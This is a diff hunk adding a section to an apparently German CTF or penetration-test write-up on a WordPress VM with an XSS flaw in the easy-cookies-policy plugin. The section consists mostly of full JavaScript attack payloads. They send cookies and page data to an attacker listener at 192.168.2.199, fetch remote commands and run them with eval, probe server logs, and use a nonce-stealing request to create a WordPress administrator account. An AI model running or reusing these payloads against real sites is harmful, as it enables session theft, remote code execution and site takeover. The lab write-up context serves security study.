@@ -980,6 +980,300 @@ Schließlich werden drei Cookies aufgelistet, die von der Seite gesetzt werden:
 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die genauen Felder im "easy-cookies-policy"-Plugin identifizieren, die für die XSS-Injektion anfällig sind (z.B. Textfelder für die Cookie-Banner-Nachricht, Button-Text etc.).
 <br><strong>Empfehlung (Admin):</strong> Plugins sorgfältig auswählen und regelmäßig auf bekannte Schwachstellen prüfen. Sicherstellen, dass Cookies, die keine clientseitige Skriptinteraktion benötigen, mit dem <code>HttpOnly</code>-Flag versehen sind, um Diebstahl durch XSS zu erschweren.</p>
         </section>
+<br>
+<hr>
+<br>
+<h3>Ich habe hier mehrere Scripte gebaut für unterschiedliche zwecke, ihr name dient dem Zweck.</h3>
+<b>Sie wurden mehrmals angepasst um sich der Situation anzupassen:</b>
+<br> <pre> 
+-rw-r--r-- 1 root root 8971 27. Mai 16:08 attack_script.js
+-rw-r--r-- 1 root root 1808 27. Mai 22:02 check_admin_login.js
+-rw-r--r-- 1 root root 3773 27. Mai 23:04 create_admin_script.js
+-rw-r--r-- 1 root root  629 27. Mai 16:36 log_trigger_script.js
+-rw-r--r-- 1 root root 1330 27. Mai 17:13 nginx_log_probe.js
+-rw-r--r-- 1 root root 3417 27. Mai 15:55 xss_handler.js
+ </pre> <br>
+<h3>Sie werden sehr ausführlich Zeile für Zeile beschrieben:</h3>
+
+
+<hr>
+<br>
+
+<b>xss_handler.js testet ob die XSS Schwachstelle ausnutzbar ist:</b>
+<br>
+ <pre> 
+                                                                                
+┌──(root㉿CCat)-[~/Hackingtools/shells]
+└─# cat xss_handler.js    
+// xss_handler_direct_exec.js
+var attacker_server = 'http://192.168.2.199:8000';
+var report_server = 'http://192.168.2.199:9001';
+var command_file = 'commands2.txt';
+
+function reportToServer(paramName, data) {
+    var i = new Image();
+    var jsonPayload;
+    try {
+        if (data && typeof data.nodeType === 'number' && typeof data.nodeName === 'string') {
+            if (data.outerHTML) {
+                jsonPayload = JSON.stringify({type: 'DOMElement', content: data.outerHTML.substring(0, 1000) + (data.outerHTML.length > 1000 ? '...' : '')});
+            } else {
+                jsonPayload = JSON.stringify({type: 'DOMElement', nodeName: data.nodeName, nodeValue: data.nodeValue});
+            }
+        } else if (typeof data === 'object' && data !== null) {
+            var cache = [];
+            jsonPayload = JSON.stringify(data, function(key, value) {
+                if (typeof value === 'object' && value !== null) {
+                    if (cache.indexOf(value) !== -1) { return '[Circular Reference]'; }
+                    cache.push(value);
+                }
+                return value;
+            }, 2);
+            cache = null;
+        } else if (typeof data === 'undefined') {
+            jsonPayload = JSON.stringify('[undefined]');
+        } else {
+            jsonPayload = JSON.stringify(data); // Stringify des (möglicherweise schon) Strings
+        }
+    } catch (e) {
+        jsonPayload = JSON.stringify('[Serialization Error]: ' + e.toString());
+    }
+    i.src = report_server + '/?' + paramName + '=' + encodeURIComponent(jsonPayload.substring(0, 1800));
+}
+
+// Sofort versuchen, Befehle zu laden und auszuführen
+function executeCommandFromFile() {
+    fetch(attacker_server + '/' + command_file + '?r=' + Math.random())
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response for ' + command_file + ' was not ok: ' + response.status + ' ' + response.statusText);
+            }
+            return response.text();
+        })
+        .then(commandText => {
+            var command = commandText.trim();
+            if (command !== '') {
+                reportToServer('direct_cmd_received', {command_text: command});
+                try {
+                    var result = eval(command);
+                    reportToServer('direct_cmd_result', {command: command, result: result, status: 'success'});
+                } catch (e) {
+                    reportToServer('direct_cmd_error', {command: command, error_message: e.message, error_stack: e.stack, status: 'eval_error'});
+                }
+            } else {
+                reportToServer('direct_cmd_status', 'commands_file_empty_on_load');
+            }
+        })
+        .catch(error => {
+            reportToServer('direct_fetch_cmd_error', {error_message: error.message, error_stack: error.stack});
+        });
+}
+
+// Starte den Prozess
+try {
+    var initialData = {
+        status: 'xss_handler_direct_exec_loaded', // Neuer Status
+        page_title: document.title,
+        location: window.location.href,
+        user_agent: navigator.userAgent,
+        cookies_available: document.cookie
+    };
+    reportToServer('handler_status', initialData);
+    executeCommandFromFile(); // Führe es direkt aus, kein Loop mehr
+} catch (e) {
+    var i = new Image();
+    i.src = report_server + '/?initial_error=' + encodeURIComponent(e.toString().substring(0,100));
+}
+<hr>
+
+
+<b>log_trigger_script.js testet ob sich die logs auslesen lassen, ports selbst anpassen 80/8080 aber ngingx war auch auf 80 auslesbar:</b>
+
+┌──(root㉿CCat)-[~/Hackingtools/shells]
+└─# cat log_trigger_script.js
+// ~/Hackingtools/shells/log_trigger_script.js
+(function() {
+    var unique_marker = 'CVE_2021_24405_PoC_By_CCat_' + Math.random().toString(36).substring(2, 10);
+    var img = new Image();
+    // Ruft eine nicht existierende PHP-Seite im WordPress-Kontext auf, um im Apache-Log zu landen
+    img.src = '/sitecore/' + unique_marker + '.php'; 
+    
+    // Optional: Sende eine Bestätigung an deinen Debug-Listener
+    var kali_ip = '192.168.2.199';
+    var debug_listener_port = '9001';
+    var i2 = new Image();
+    i2.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?xss_triggered_log_attempt=' + unique_marker;
+})();
+<hr>
+<br>
+ </pre> 
+<b>nginx_log_probe.js testet ob sich die logs auslesen lassen für Nginx LOGS, ports selbst anpassen 80/8080 aber ngingx war auch auf 80 auslesbar:</b>
+<br>
+ <pre> 
+                                                                                
+┌──(root㉿CCat)-[~/Hackingtools/shells]
+└─# cat nginx_log_probe.js   
+// ~/Hackingtools/shells/nginx_log_probe.js
+(function() {
+    var kali_ip = '192.168.2.199';
+    var debug_listener_port = '9001';
+    var unique_marker_nginx = 'NGINX_PROBE_By_CCat_' + Math.random().toString(36).substring(2, 12);
+    
+    // Wir wissen, dass Nginx auf Port 8080 auf Hostnamen 'shemhamphorash.local' und 'calaV'
+    // (und wahrscheinlich die IP 192.168.2.202) reagiert, auch wenn bisher mit leerem Inhalt.
+    // Wir verwenden 'shemhamphorash.local' als erstes, da es für WordPress auf Port 80 funktioniert.
+    var target_host_for_nginx = 'shemhamphorash.local'; 
+    // Alternativ könntest du hier auch 'calaV' oder direkt '192.168.2.202' versuchen,
+    // wenn 'shemhamphorash.local' nicht den gewünschten Effekt im Nginx-Log hat.
+
+    var img = new Image();
+    // Rufe eine nicht existierende Ressource auf dem Nginx-Port mit dem speziellen Host auf
+    // Wir verwenden .txt am Ende, um es von PHP-Requests im Apache-Log zu unterscheiden.
+    img.src = 'http://' + target_host_for_nginx + ':8080/' + unique_marker_nginx + '.txt';
+
+    // Bestätigung an unseren Debug-Listener, dass der Versuch gestartet wurde
+    var i2 = new Image();
+    i2.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?nginx_log_probe_sent=' + unique_marker_nginx + '&target_nginx_host=' + target_host_for_nginx;
+})();<br>
+ </pre> 
+
+<hr><br>
+<b>attack_script.js testet ob eine reverse SHell möglich ist über die xss:</b>
+
+<b>benötigen sie nicht da es absolut erfolglos war, wurde ausgiebig getestet....</b>
+
+<hr>
+<br>
+<b>check_admin_login.js testet ob der admin bot ein admin ist in Wordpress und was er auf der vm für Privs hat:</b>
+<br>
+ <pre>                                                                               
+┌──(root㉿CCat)-[~/Hackingtools/shells]
+└─# cat check_admin_login.js
+// ~/Hackingtools/shells/check_admin_login.js
+(async function() {
+    var kali_ip = '192.168.2.199';
+    var debug_listener_port = '9001';
+
+    function report(paramName, data) {
+        var i = new Image();
+        var jsonData = "[Error Stringifying]";
+        try {
+            jsonData = JSON.stringify(data);
+        } catch (e) {
+            // ignore serialization errors for now, or send a specific error
+        }
+        i.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?' + paramName + '=' + encodeURIComponent(jsonData.substring(0,1000));
+    }
+
+    report('check_login_status', 'check_admin_login.js loaded by bot');
+
+    try {
+        // Wichtig: redirect: 'manual' um den Redirect selbst zu sehen, nicht ihm zu folgen
+        const response = await fetch('/sitecore/wp-admin/index.php', {credentials: 'include', redirect: 'manual'});
+        
+        report('check_login_result', { 
+            url_requested: '/sitecore/wp-admin/index.php', // Die URL, die wir angefragt haben
+            response_url: response.url,                   // Die URL, die der Browser nach (blockierten) Redirects sieht
+            status: response.status,                      // HTTP Status Code
+            type: response.type,                          // 'basic', 'cors', 'error', 'opaque', 'opaqueredirect'
+            is_admin_likely: (response.status === 200 && response.url.includes('/wp-admin/index.php') && !response.url.includes('wp-login.php')),
+            redirected_to_login: (response.type === 'opaqueredirect' || (response.url && response.url.includes('wp-login.php')) || response.status === 0 || response.status === 302)
+        });
+
+    } catch (e) {
+        report('check_login_fatal_error', {message: e.message, stack: e.stack ? e.stack.substring(0,300) : "No stack"});
+    }</pre>
+
+
+<hr>
+<br>
+<b>create_admin_script.js versucht einen admin account auf wordpress zu erstellen aber vergeblich:
+im grunde reichen die Log scripte und die xss..js, sollten sie vielleicht aber doch ein weg finden
+indem sie das script anpassen , hier der sourcecode mit beschreibung:</b>
+<br><pre>
+┌──(root㉿CCat)-[~/Hackingtools/shells]
+└─# cat create_admin_script.js
+(async function() {
+    var kali_ip = '192.168.2.199';
+    var debug_listener_port = '9001';
+    var new_admin_user = 'xssmasterccat'; 
+    var new_admin_pass = 'P@$$wOrdCCat987!'; 
+
+    function reportToListener(eventName, eventData) {
+        var i = new Image();
+        var payload = { event: eventName, data: eventData, timestamp: Date.now() };
+        try {
+            i.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?' + encodeURIComponent(JSON.stringify(payload).substring(0, 1800));
+        } catch (e) {
+            i.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?error_reporting_data&message=' + encodeURIComponent(e.message);
+        }
+    }
+
+    reportToListener('script_loaded', { user_agent: navigator.userAgent, location: window.location.href });
+
+    try {
+        reportToListener('fetch_nonce_start', { url: '/sitecore/wp-admin/user-new.php' });
+        const responseUserNewPage = await fetch('/sitecore/wp-admin/user-new.php', { credentials: 'include' });
+
+        reportToListener('fetch_nonce_response', { status: responseUserNewPage.status, ok: responseUserNewPage.ok, url: responseUserNewPage.url });
+
+        if (!responseUserNewPage.ok || (responseUserNewPage.url && responseUserNewPage.url.includes('wp-login.php'))) {
+            const responseText = await responseUserNewPage.text();
+            reportToListener('fetch_nonce_failed_or_redirected', { status: responseUserNewPage.status, redirected_to_login: true, html_sample: responseText.substring(0, 200) });
+            return; 
+        }
+        
+        const userNewPageHtml = await responseUserNewPage.text();
+        reportToListener('fetch_nonce_got_html', { length: userNewPageHtml.length });
+        
+        const nonceMatch = userNewPageHtml.match(/name="_wpnonce_create-user"\s*value="([^"]+)"/);
+        if (!nonceMatch || !nonceMatch[1]) {
+            reportToListener('nonce_extraction_failed', { html_sample: userNewPageHtml.substring(0, 500) });
+            return; 
+        }
+        const nonce = nonceMatch[1];
+        reportToListener('nonce_extracted', { nonce: nonce });
+
+        reportToListener('create_user_start', { username: new_admin_user });
+        
+        const createUserResponse = await fetch('/sitecore/wp-admin/user-new.php', {
+            method: 'POST',
+            credentials: 'include',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams({
+                'action': 'createuser',
+                '_wpnonce_create-user': nonce,
+                'user_login': new_admin_user,
+                'email': new_admin_user + '@shemhamphorash.local',
+                'first_name': 'XSS',
+                'last_name': 'MasterCCat',
+                'url': '',
+                'pass1': new_admin_pass,
+                'pass2': new_admin_pass,
+                'role': 'administrator',
+                'createuser': 'Add New User' 
+            }).toString()
+        });
+
+        reportToListener('create_user_response', { status: createUserResponse.status, ok: createUserResponse.ok, url: createUserResponse.url, redirected: createUserResponse.redirected });
+
+        if (createUserResponse.ok || createUserResponse.redirected || createUserResponse.status === 302) { 
+            reportToListener('create_user_success', { username: new_admin_user, password: new_admin_pass });
+        } else {
+            const responseText = await createUserResponse.text();
+            reportToListener('create_user_failed', { status: createUserResponse.status, html_sample: responseText.substring(0, 500) });
+        }
+
+    } catch (e) {
+        reportToListener('script_fatal_error', { message: e.message, stack_sample: e.stack ? e.stack.substring(0, 300) : "No stack" });
+    }
+})();
+</pre>
+<br>
+<hr>
+
+
+
 
         <section id="proof-of-concept">
             <h2>Proof of Concept (XSS & User Creation)</h2>
